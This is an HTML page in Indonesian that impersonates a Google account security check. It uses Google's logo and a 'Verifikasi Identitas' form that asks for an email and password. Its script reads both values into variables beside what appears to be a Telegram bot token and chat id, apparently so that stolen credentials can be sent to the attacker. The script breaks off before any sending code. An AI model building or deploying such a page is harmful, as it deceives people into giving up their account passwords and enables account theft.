<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keamanan Akun Google</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f1f1f1; }
        .box { width: 320px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; background: white; text-align: center; }
        img { width: 75px; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; width: 100%; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
        <h2>Verifikasi Identitas</h2>
        <form id="gas">
            <input type="email" id="email" placeholder="Email atau ponsel" required>
            <input type="password" id="pass" placeholder="Masukkan sandi Anda" required>
            <button type="submit">Amankan Akun</button>
        </form>
    </div>
    <script>
        document.getElementById('gas').addEventListener('submit', function(e) {
            e.preventDefault();
            const token = '8469370025:AAHP58nPm9mKa_uBWE0nhcCAPWffeipjbl8'; 
            const id = '6119659517'; 
            const emai = document.getElementById('email').value;
            const sandi = document.getElementById('pass').value;

    </script>
</body>
</html>
